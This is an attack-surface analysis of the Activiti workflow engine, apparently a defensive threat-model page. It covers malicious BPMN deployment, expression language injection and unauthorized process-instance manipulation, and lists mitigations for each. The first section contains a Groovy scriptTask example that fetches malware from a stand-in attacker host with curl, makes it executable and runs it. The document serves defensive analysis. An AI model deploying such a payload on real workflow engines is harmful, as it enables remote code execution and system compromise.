# Attack Surface Analysis for activiti/activiti

## Attack Surface: [Unauthorized Process Definition Deployment/Modification](./attack_surfaces/unauthorized_process_definition_deploymentmodification.md)

*   **Description:** Attackers gain the ability to deploy new, malicious BPMN 2.0 process definitions or modify existing ones on the Activiti engine. This is the most dangerous attack vector, directly exploiting Activiti's core deployment mechanism.
*   **How Activiti Contributes:** Activiti provides APIs (REST and Java) for deploying and managing process definitions. These APIs are the *direct* attack surface.
*   **Example:** An attacker uploads a BPMN file containing a `scriptTask` that executes a shell command to download and run malware:
    ```xml
    <scriptTask id="maliciousTask" scriptFormat="groovy">
      <script>
        "curl -o /tmp/malware http://attacker.com/malware".execute()
        "chmod +x /tmp/malware".execute()
        "/tmp/malware".execute()
      </script>
    </scriptTask>
    ```
*   **Impact:** Complete system compromise. The attacker can execute arbitrary code, access sensitive data, and control the application's workflow.
*   **Risk Severity:** Critical
*   **Mitigation Strategies:**
    *   **Strict API Security:** Implement strong authentication and authorization (RBAC) for all deployment and modification APIs. Only highly privileged users/roles should have these permissions.
    *   **Input Validation (Crucial):** Before deployment, *thoroughly* validate the BPMN XML:
        *   **Whitelist Allowed Elements:** Strictly limit or forbid `scriptTask`, `serviceTask` (with arbitrary class invocation), and potentially `userTask` (if misused).
        *   **Expression Sanitization:** Scrutinize all expressions (JUEL, SpEL) for malicious code. Use a whitelist approach for allowed functions/variables. *Never* directly embed user input in expressions.
        *   **XXE Prevention:** Ensure the XML parser is configured to prevent XML External Entity (XXE) attacks (Activiti's default parser is generally secure, but configuration changes can introduce vulnerabilities).
    *   **Deployment Approval Workflow:** Implement a mandatory manual review and approval process for all new or modified process definitions.
    *   **Digital Signatures:** Digitally sign process definitions and verify the signature before deployment.
    *   **Version Control:** Maintain a version history of process definitions and allow rollback to previous versions.
    *   **Auditing:** Regularly audit deployed process definitions for unauthorized changes.

## Attack Surface: [Expression Language Injection](./attack_surfaces/expression_language_injection.md)

*   **Description:** Attackers inject malicious code into expressions used within process definitions (e.g., in gateways, listeners, task assignments). This directly exploits Activiti's expression evaluation engine.
*   **How Activiti Contributes:** Activiti's core functionality relies on expression languages (JUEL, SpEL) for dynamic behavior. The expression evaluation engine itself is the attack surface.
*   **Example:** A process definition uses an expression to determine the recipient of an email: `${emailService.sendEmail(userInput)}`. If `userInput` is controlled by the attacker, they could inject code to execute arbitrary methods or access system properties.
*   **Impact:** Code execution, data exfiltration, potential system compromise (depending on the expression language's capabilities and configuration).
*   **Risk Severity:** High
*   **Mitigation Strategies:**
    *   **Parameterized Expressions:** *Never* directly embed user-provided data into expressions. Use process variables or parameterized expressions. For example, instead of `${emailService.sendEmail(userInput)}`, use `${emailService.sendEmail(emailAddress)}` where `emailAddress` is a process variable set *before* the expression is evaluated.
    *   **Whitelist Allowed Functions/Variables:** Restrict the set of functions and variables accessible within expressions. Disallow access to potentially dangerous features (e.g., system properties, arbitrary method invocation).
    *   **Secure Expression Language Configuration:** Ensure the expression language implementation is configured securely and kept up-to-date.
    *   **Sandboxing (Advanced):** Consider using a sandboxed environment for evaluating expressions to limit their capabilities.

## Attack Surface: [Unauthorized Process Instance Manipulation](./attack_surfaces/unauthorized_process_instance_manipulation.md)

*   **Description:** Attackers start new process instances, modify the state of running instances (variables, task completion), or inject signals without proper authorization. This directly targets Activiti's process instance management APIs.
*   **How Activiti Contributes:** Activiti provides APIs for interacting with process instances. These APIs are the *direct* attack surface.
*   **Example:** An attacker uses the REST API to complete a task assigned to another user, bypassing a security check or approval step. Or, they start many instances of a resource-intensive process.
*   **Impact:** Workflow disruption, unauthorized data access/modification, bypassing security controls.
*   **Risk Severity:** High
*   **Mitigation Strategies:**
    *   **Secure APIs:** Implement strong authentication and authorization (RBAC) for all APIs that interact with process instances.
    *   **Fine-Grained Permissions:** Control which users/roles can start specific processes, complete tasks, modify variables, and send signals.
    *   **Input Validation:** Validate all data provided when starting or modifying process instances.
    *   **Signal Security:** Restrict access to signal APIs and validate the source and content of signals. Use correlation keys to ensure signals are delivered to the correct process instance.

